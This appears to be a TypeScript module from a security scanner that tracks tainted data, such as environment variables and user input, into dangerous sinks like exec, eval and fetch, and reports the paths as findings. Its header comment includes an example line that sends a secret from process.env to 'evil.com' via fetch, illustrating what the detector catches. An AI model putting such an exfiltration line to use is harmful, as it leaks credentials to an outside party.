/**
 * Layer 5: Dataflow/Taint Analysis
 *
 * Tracks how data flows from taint sources (env vars, user input, network)
 * to dangerous sinks (exec, eval, fetch, file writes).
 *
 * Detects multi-step attacks that pattern matching misses:
 * - const key = process.env.SECRET; fetch('evil.com', {body: key})
 * - const a = input; const b = a; exec(b)
 * - config.key = process.env.KEY; send(config.key)
 *
 * Phase 3.1: Dataflow Implementation (v1.0.0)
 */

import * as ts from 'typescript';
import { Finding, Skill } from '../types.js';
import { buildDataFlowGraph } from '../analysis/dataflow-graph.js';
import {
  propagateTaint,
  findTaintPaths,
  extractTaintSources,
  extractTaintSinks,
} from '../analysis/taint-propagation.js';
import { DataFlowPath, DataFlowNode, TaintSource, TaintSink } from '../analysis/dataflow-types.js';

export interface DataflowScanResult {
  findings: Finding[];
  stats: {
    nodesAnalyzed: number;
    edgesAnalyzed: number;
    sourcesFound: number;
    sinksFound: number;
    pathsDetected: number;
    filesSkipped: number;
  };
}

/**
 * Perform dataflow analysis on skill files
 */
export async function scanDataflow(skill: Skill): Promise<DataflowScanResult> {
  const findings: Finding[] = [];
  let totalNodes = 0;
  let totalEdges = 0;
  let totalSources = 0;
  let totalSinks = 0;
  let totalPaths = 0;
  let filesSkipped = 0;

  // Only analyze TypeScript/JavaScript files
  const filesToAnalyze = skill.codeFiles.filter((file) => {
    return (
      (file.extension === 'ts' ||
       file.extension === 'js' ||
       file.path.endsWith('.tsx') ||
       file.path.endsWith('.jsx')) &&
      !file.path.endsWith('.d.ts') &&
      !file.path.includes('.test.') &&
      !file.path.includes('.spec.')
    );
  });

  for (const file of filesToAnalyze) {
    const filePath = file.path;
    const content = file.content;
    try {
      // Parse TypeScript code to AST
      const sourceFile = ts.createSourceFile(
        filePath,
        content,
        ts.ScriptTarget.Latest,
        true
      );

      // Surface parser diagnostics instead of silently skipping malformed files
      if (sourceFile.parseDiagnostics.length > 0) {
        filesSkipped++;
        findings.push({
          severity: 'INFO',
          category: 'analysis-diagnostics',
          title: 'Dataflow skipped file with parse errors',
          file: filePath,
          detail: 'Dataflow analysis skipped this file because TypeScript parsing reported syntax errors.',
          evidence: `Parse diagnostics: ${sourceFile.parseDiagnostics.length}`,
          patternId: 'diag-dataflow-parse-skipped',
        });
        continue;
      }

      // Build dataflow graph
      const graph = buildDataFlowGraph(sourceFile);
      totalNodes += graph.nodes.length;
      totalEdges += graph.edges.length;

      // Extract sources and sinks
      const sources = extractTaintSources(graph);
      const sinks = extractTaintSinks(graph);
      totalSources += sources.length;
      totalSinks += sinks.length;

      // No sources or sinks? Skip dataflow analysis
      if (sources.length === 0 || sinks.length === 0) {
        continue;
      }

      // Propagate taint from sources through graph
      const taintedNodeIds = propagateTaint(graph, sources);

      // Find paths from sources to sinks
      const paths = findTaintPaths(graph, sources, sinks, taintedNodeIds);
      totalPaths += paths.length;

      // Generate findings for each path
      for (const path of paths) {
        findings.push(createDataflowFinding(filePath, path));
      }
    } catch (error) {
      filesSkipped++;
      findings.push({
        severity: 'INFO',
        category: 'analysis-diagnostics',
        title: 'Dataflow skipped file due to analyzer error',
        file: filePath,
        detail: 'Dataflow analysis could not analyze this file due to an internal error.',
        evidence: (error as Error).message || 'Unknown dataflow analyzer error',
        patternId: 'diag-dataflow-analyzer-skipped',
      });
    }
  }

  return {
    findings,
    stats: {
      nodesAnalyzed: totalNodes,
      edgesAnalyzed: totalEdges,
      sourcesFound: totalSources,
      sinksFound: totalSinks,
      pathsDetected: totalPaths,
      filesSkipped,
    },
  };
}

/**
 * Create a Finding from a dataflow path
 */
function createDataflowFinding(filePath: string, path: DataFlowPath): Finding {
  const { source, sink, path: nodes, confidence, severity } = path;

  // Build evidence string showing the dataflow path
  const evidence = buildEvidenceString(source, sink, nodes);

  // Build detailed message
  const detail = buildDetailMessage(source, sink, confidence);

  // Category based on sink type
  const category = getCategoryForSink(sink.type);

  return {
    severity,
    category,
    title: `Tainted data reaches dangerous sink: ${sink.function}()`,
    file: filePath,
    line: sink.line,
    detail,
    evidence,
    patternId: `taint-${source.type}-to-${sink.type}`,
  };
}

/**
 * Build evidence string showing the dataflow path
 */
function buildEvidenceString(
  source: TaintSource,
  sink: TaintSink,
  path: DataFlowNode[]
): string {
  const sourceDesc = `${source.identifier} (line ${source.line})`;
  const sinkDesc = `${sink.function}() (line ${sink.line})`;

  if (path.length <= 2) {
    // Direct flow
    return `${sourceDesc} → ${sinkDesc}`;
  }

  // Show intermediate steps (max 5)
  const intermediates = path.slice(1, -1).slice(0, 5);
  const intermediateDesc = intermediates
    .map((node: any) => node.identifier || node.type)
    .join(' → ');

  const hasMore = path.length > 7 ? ' → ...' : '';

  return `${sourceDesc} → ${intermediateDesc}${hasMore} → ${sinkDesc}`;
}

/**
 * Build detailed message explaining the issue
 */
function buildDetailMessage(
  source: TaintSource,
  sink: TaintSink,
  confidence: string
): string {
  const sourceTypeDesc = getSourceTypeDescription(source.type);
  const sinkTypeDesc = getSinkTypeDescription(sink.type);

  let message = `${sourceTypeDesc} flows to ${sinkTypeDesc}. `;

  // Add confidence note
  if (confidence === 'low') {
    message += 'Note: This analysis detected a complex dataflow path. Manual review recommended to confirm. ';
  } else if (confidence === 'medium') {
    message += 'Note: This dataflow involves some indirection. Review the path to confirm the issue. ';
  }

  // Add remediation advice
  message += getRemediationAdvice(source.type, sink.type);

  return message;
}

/**
 * Get human-readable source type description
 */
function getSourceTypeDescription(sourceType: string): string {
  switch (sourceType) {
    case 'env-var':
      return 'Environment variable';
    case 'user-input':
      return 'User input';
    case 'network-response':
      return 'Network response data';
    case 'file-input':
      return 'File input';
    default:
      return 'Untrusted data';
  }
}

/**
 * Get human-readable sink type description
 */
function getSinkTypeDescription(sinkType: string): string {
  switch (sinkType) {
    case 'command-execution':
      return 'command execution';
    case 'code-evaluation':
      return 'code evaluation';
    case 'network-request':
      return 'network request';
    case 'file-write':
      return 'file write';
    case 'dynamic-import':
      return 'dynamic import';
    default:
      return 'dangerous operation';
  }
}

/**
 * Get remediation advice based on source/sink combination
 */
function getRemediationAdvice(sourceType: string, sinkType: string): string {
  if (sourceType === 'env-var' && sinkType === 'network-request') {
    return 'Avoid sending environment variables to external servers. If necessary, ensure the destination is trusted and uses HTTPS.';
  }

  if (sourceType === 'env-var' && sinkType === 'command-execution') {
    return 'Never pass environment variables directly to command execution. If needed, validate and sanitize the input first.';
  }

  if (sourceType === 'user-input' && sinkType === 'command-execution') {
    return 'Never pass user input directly to command execution. Use parameterized APIs or strict validation.';
  }

  if (sourceType === 'user-input' && sinkType === 'code-evaluation') {
    return 'Never pass user input to eval() or Function(). Consider safer alternatives like JSON.parse() or sandboxed execution.';
  }

  if (sinkType === 'network-request') {
    return 'Ensure sensitive data is not sent to untrusted external servers.';
  }

  return 'Validate and sanitize all untrusted data before use in sensitive operations.';
}

/**
 * Get finding category based on sink type
 */
function getCategoryForSink(sinkType: string): string {
  switch (sinkType) {
    case 'command-execution':
      return 'command-injection';
    case 'code-evaluation':
      return 'code-injection';
    case 'network-request':
      return 'data-exfiltration';
    case 'file-write':
      return 'path-traversal';
    case 'dynamic-import':
      return 'malicious-code';
    default:
      return 'taint-flow';
  }
}
